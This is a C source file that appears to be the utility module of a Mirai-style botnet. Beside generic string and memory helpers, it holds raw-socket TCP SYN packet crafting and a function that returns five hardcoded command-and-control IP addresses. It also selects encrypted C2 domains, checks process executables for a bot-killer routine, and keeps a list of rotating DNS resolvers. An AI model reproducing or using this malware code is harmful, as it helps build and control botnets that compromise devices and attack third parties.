#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <time.h>

#include <sys/socket.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <sys/select.h>
#include <fcntl.h>

#include "headers/includes.h"
#include "headers/util.h"
#include "headers/checksum.h"
#include "headers/rand.h"
#include "../encryption/chacha20_table.h"

int memory_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

char *hex_to_text(char *hex_string)
{
    char *text = malloc((_strlen(hex_string) / 2) + 1);
    if (text == NULL)
    {
        return NULL; // error handling for malloc failure
    }
    int text_len = 0;

    for (int i = 0; hex_string[i] && hex_string[i + 1]; i += 2)
    {
        char hex_pair[3] = {hex_string[i], hex_string[i + 1], '\0'};
        int hex_value;
        sscanf(hex_pair, "%x", &hex_value);
        text[text_len++] = (char)hex_value;
    }

    text[text_len] = '\0';

    return text;
}
int tcp_handshake(const uint16_t port, const int fd, const int dest_addr, const int source_ip, const int source_port)
{

    const int ttl = 64;
    const int ihl = 5;
    const int version = 4;

    int id = rand_next() & 0xffff;

    char data[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
    char temp[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};

    char recv_buf[512] = {0};

    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    struct sockaddr_in addr;

    int ret = 0;

    ip_header = (struct iphdr *)data;
    tcp_header = (struct tcphdr *)(ip_header + 1);

    ip_header->ihl = ihl;
    ip_header->version = version;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip_header->ttl = ttl;
    ip_header->protocol = IPPROTO_TCP;

    tcp_header->dest = htons(port);
    tcp_header->source = htons(source_port);
    tcp_header->doff = 5;
    tcp_header->window = rand_next() & 0xffff;
    tcp_header->ack = 0;
    tcp_header->fin = 0;
    tcp_header->urg = 0;
    tcp_header->psh = 0;
    tcp_header->rst = 0;
    tcp_header->syn = 1;
    tcp_header->ack_seq = 0;

    ip_header->id = rand_next() & 0xffff;
    ip_header->saddr = source_ip;
    ip_header->daddr = dest_addr;

    ip_header->check = 0;
    ip_header->check = checksum_generic((uint16_t *)ip_header, sizeof(struct iphdr));

    tcp_header->seq = rand_next() & 0xFFFF;
    tcp_header->check = 0;
    tcp_header->check = checksum_tcpudp(ip_header, tcp_header, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

    addr.sin_family = AF_INET;
    addr.sin_port = tcp_header->dest;
    addr.sin_addr.s_addr = ip_header->daddr;

    _memcpy(temp, data, sizeof(data)); // temp copy.

    debug("Sending SYN with ACK: %d SEQ: %d\n", ntohl(tcp_header->ack_seq), ntohl(tcp_header->seq));

    ret = sendto(fd, data, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));

    if (ret == -1)
    {
        return 0;
    }

    ip_header = (struct iphdr *)recv_buf;
    tcp_header = (struct tcphdr *)(ip_header + 1);

    int count = 0;

    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;

    ret = setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof tv);

    if (ret == -1)
        return 0;

    while (count < 10000)
    {
        ret = recvfrom(fd, recv_buf, sizeof(recv_buf), MSG_NOSIGNAL, NULL, NULL);

        if (count >= 9999)
            return 0;

        if (ret == -1)
        {
            break;
        }

        if (ip_header->saddr == dest_addr && tcp_header->ack == 1 && tcp_header->syn == 1)
        {
            debug("Received SYN-ACK with ACK: %d SEQ: %d\n", ntohl(tcp_header->ack_seq), ntohl(tcp_header->seq));

            int server_ack = htonl(ntohl(tcp_header->seq) + 1);
            int server_seq = tcp_header->ack_seq;

            ip_header = (struct iphdr *)temp;
            tcp_header = (struct tcphdr *)(ip_header + 1);

            tcp_header->ack = 1;
            tcp_header->fin = 0;
            tcp_header->urg = 0;
            tcp_header->psh = 0;
            tcp_header->rst = 0;
            tcp_header->syn = 0;
            tcp_header->ack_seq = server_ack;
            tcp_header->seq = server_seq;

            ip_header->id = rand_next() & 0xffff;
            ip_header->check = 0; // measure checksum with 0 checksum field
            ip_header->check = checksum_generic((uint16_t *)ip_header, sizeof(struct iphdr));

            tcp_header->check = 0;
            tcp_header->check = checksum_tcpudp(ip_header, tcp_header, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

            addr.sin_family = AF_INET;
            addr.sin_port = tcp_header->dest;
            addr.sin_addr.s_addr = ip_header->daddr;

            debug("Sending SYN with ACK: %d SEQ: %d\n", ntohl(tcp_header->ack_seq), ntohl(tcp_header->seq));
            ret = sendto(fd, temp, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));

            break;
        }

        count++;
    }

    if (count >= 9999)
        return 0;

    return ret == -1 ? 0 : 1;
}

int _strlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}

int _exe_access()
{

    char path[PATH_MAX], tmp[16];
    int fd;

    _strcpy(path, enc[KILLER_PROC].string);
    _strcat(path, _itoa(getpid(), 10, tmp));
    _strcat(path, enc[KILLER_EXE].string);

    if ((fd = open(path, O_RDONLY)) == -1)
        return 0;

    close(fd);

    return 1;
}

char *_self_path()
{
    char *selfpath = malloc(PATH_MAX);
    readlink(enc[PROC_SELF_EXE].string, selfpath, 256);
    return selfpath;
}

int _opennic_dns()
{
    int random = rand_next() % 11;
    switch (random)
    {
    case 0:
        return INET_ADDR(195, 10, 195, 195);
    case 1:
        return INET_ADDR(194, 36, 144, 87);
    case 2:
        return INET_ADDR(51, 254, 162, 59);
    case 3:
        return INET_ADDR(94, 16, 114, 254);
    case 4:
        return INET_ADDR(51, 158, 108, 203);
    case 5:
        return INET_ADDR(51, 77, 149, 139);
    case 6:
        return INET_ADDR(178, 254, 22, 166);
    case 7:
        return INET_ADDR(81, 169, 136, 222);
    case 8:
        return INET_ADDR(134, 195, 4, 2);
    case 9:
        return INET_ADDR(91, 217, 137, 37);
    case 10:
        return INET_ADDR(185, 181, 61, 24);
    }
}

int _random_cnc_addr_hardcode()
{
    int random = rand_next() % 5;
    switch (random)
    {
    case 0:
        return INET_ADDR(139,177,197,168);
    case 1:
        return INET_ADDR(212, 118, 43, 167);
    case 2:
        return INET_ADDR(77, 105, 138, 202);
    case 3:
        return INET_ADDR(84, 54, 47, 93);
    case 4:
        return INET_ADDR(88, 218, 62, 221);
    }
}

char *_random_domain()
{
    int random = rand_next() % 2;

    switch (random)
    {
    case 0:
        return enc[C2_DOMAIN_1].string;
    case 1:
        return enc[C2_DOMAIN_2].string;
    }

    return "";
}

int _startswith(char *haystack, char *needle)
{
    while (*needle)
    {
        if (*needle++ != *haystack++)
            return 0;
    }
    return 1;
}

char *_strdup(char *string)
{
    char *retstr = calloc(_strlen(string) + 1, sizeof(char));

    _strcpy(retstr, string);

    return retstr;
}

int _strncmp(char *str1, char *str2, int len)
{
    int l1 = _strlen(str1), l2 = _strlen(str2);

    if (l1 < len || l2 < len)
        return FALSE;

    while (len--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

int _strcmp(char *str1, char *str2)
{
    int l1 = _strlen(str1);
    int l2 = _strlen(str2);

    if (l1 != l2)
        return FALSE;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

int _strcmp2(char *str1, char *str2)
{
    int len1 = _strlen(str1), len2 = _strlen(str2);

    if (len1 != len2)
        return 1;

    while (len1--)
    {
        if (*str1++ != *str2++)
            return 1;
    }
    return 0;
}

void _strcat(char *dst, char *src)
{
    while (*dst)
        dst++;

    while (*src)
        *dst++ = *src++;

    *dst = '\0';
}

int _strcpy(char *dst, char *src)
{
    int l = _strlen(src);

    _memcpy(dst, src, l + 1);

    return l;
}

void _memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

void _zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

int _atoi(char *str)
{
    int value = 0;

    while (_isdigit(*str))
    {
        value *= 10;
        value += (int)(*str++ - '0');
    }

    return value;
}

char *_strstr(char *s, char *a)
{
    int a_len = _strlen(a), match = 0;

    while (*s != 0)
    {
        if (*s == a[match])
        {
            if (++match == a_len)
                return s - a_len + 1;
        }
        else
            match = 0;
        s++;
    }

    return NULL;
}

void _memset(void *buf, char set, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = set;
}

char *_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }

        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        _strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}

int _memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

int _stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = _strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

void rand_bytes(unsigned char *buf, int num) {
    for (int i = 0; i < num; i++) {
        buf[i] = rand() % 256;
    }
}

uint32_t _local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8, 8, 8, 8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

char *_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    } while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int _isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

int _isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int _isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

int _isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
